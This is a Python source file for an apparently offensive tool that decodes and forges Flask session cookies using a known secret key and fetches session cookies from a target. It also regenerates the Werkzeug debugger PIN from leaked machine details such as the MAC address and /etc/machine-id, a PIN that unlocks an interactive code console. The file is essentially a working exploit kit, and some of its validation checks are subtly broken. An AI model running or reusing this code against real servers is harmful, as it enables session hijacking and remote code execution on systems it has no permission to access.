import vial
from vial.session import decode, sign
from rich.prompt import Prompt as prompt
from rich.prompt import Confirm as confirm
import json
import requests
import ipaddress
import netifaces
from typing import TypedDict
import hashlib
from itertools import chain
import tomllib

class Proxy(TypedDict):
    http: str
    https: str


def check_iface(i: str): 
    try:
        host = ipaddress.IPv4Address(i)
    except ipaddress.AddressValueError:
        try:
            host = netifaces.ifaddresses(i)[netifaces.AF_INET][0]["addr"]
        except ValueError:
            vial.log.error(
                "Error detering HTTP hosting address. Did you provide an [underline]interface[/underline] or [underline]ip[/underline]?"
            )
    return str(host)


def decode_handler() -> None:
    if not vial.FETCHED_COOKIE:
        cookie = prompt.ask("[bold blue][?][/] Enter the cookie")
    else:
        cookie = vial.FETCHED_COOKIE

    cookie = decode(cookie)
    vial.log.info(f"Decoded cookie: [bold]{cookie}[/]")


def encode_handler() -> None:
    # NOTE: cookie = sign(json.loads(session_cookie_structure), secret_key, legacy=legacy)
    secret_key = prompt.ask("[bold blue][?][/] Enter the secret key")
    value = prompt.ask("[bold blue][?][/] Enter the session cookie")
    legacy = confirm.ask("[bold blue][?][/] Use a legacy timestamp")

    cookie = sign(json.loads(value), secret_key, legacy=legacy)
    # NOTE: Create arguments for SALT
    # actions = {"inject": inject_cookie, "save": save_cookie}

    # action = prompt.ask(
    #   "[bold blue][?][/] Pick an action",
    #  choices=[action for action in actions.keys()],
    # )
    vial.log.info(f"Encoded cookie: [bold]{cookie}[/]")


def inject_cookie():
    try:
        host = prompt.ask("[bold blue][?][/] Enter the host")
        resp = vial.web_session.get(
            host,
        )
    except requests.RequestException as e:
        return vial.log.error(
            f"Failed to fetch session data from the server. {e}",
        )

    vial.log.info(f"Server returned HTTP {resp.status_code} ({resp.reason})")


def fetch_cookie(
    host: str,
    cookie_name: str = vial.DEFAULT_COOKIE_NAME,
    session: requests.Session = vial.web_session,
) -> str:
    try:
        resp = vial.web_session.get(
            host,
            allow_redirects=False,
        )
    except requests.RequestException as e:
        return vial.log.error(
            f"Failed to fetch session data from the server. {e}",
        )

    vial.log.info(f"Server returned HTTP {resp.status_code} ({resp.reason})")
    cookie = vial.web_session.cookies.get(cookie_name)
    if not cookie:
        return vial.log.error(
            "Failed to fetch session data from the server. Are you sure the url  and cookie name are correct?",
        )
    vial.log.info(f"[bold green][+][/] Session cookie: [bold]{cookie}[/]")
    return cookie

def generate_pin(config: str) -> bytes:
    """
    public_bits = [
        username
        modname
        getattr(app, '__name__', getattr(app.__class__, '__name__'))
        getattr(mod, '__file__', None),
    ]
    private_bits = [
        str(uuid.getnode()),  /sys/class/net/ens33/address
        get_machine_id(), /etc/machine-id
    ]

    LOGIC:
    - Parse the configuration and retrieve private/public bytes.
    - Generate and return PIN
    """
    with open(config, "rb") as fd:
        data = tomllib.load(fd)["pin_gen"]
        pinsalt = data["pinsalt"]
        public_bits = {
            "username": data["username"],
            "modname": data["modname"],
            "magic": data["magic"],
            "abs_path": data["abs_path"],
            "platform": data["platform"]
        } 
        private_bits = {
            "mac": data["mac"],
            "machine-id": data["machine-id"]
        } 
    # Check if bits are configured properly
    for bit in chain(public_bits, private_bits):
        if not bit in ("platform") and bit == "": # Will change to ("platform", "abs_path")
            vial.log.error("Missing required bits.")

    vial.log.info(f"Using config -> {config}:\n{data}")
    salt = vial.DEFAULT_SALT.encode()
    #h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
    h = hashlib.sha1()
    for bit in chain(public_bits.values(), private_bits.values()):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode()
        h.update(bit)
    h.update(salt)

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(pinsalt.encode())
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv = None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size))
                break
         
    else:
        rv = num
    vial.log.info(f"PIN: [bold]{rv}[/]")
    return rv
